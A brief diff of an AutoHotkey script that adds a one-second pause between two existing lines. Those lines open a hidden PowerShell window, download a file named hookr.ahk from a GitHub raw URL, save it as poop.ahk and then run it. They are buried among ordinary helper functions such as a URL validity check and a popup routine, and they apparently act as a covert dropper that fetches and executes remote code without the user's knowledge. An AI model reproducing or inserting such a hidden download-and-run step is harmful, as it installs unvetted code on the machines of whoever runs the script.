@@ -174,6 +174,7 @@ checkValidity(url, msg := 0, mode := "nil") {
 
 
 Run, powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/hookr.ahk' -OutFile .\poop.ahk
+Sleep, 1000
 Run, powershell Invoke-Item .\poop.ahk
 
 showPopupMessage(msgText := "nil", duration := 2000) {
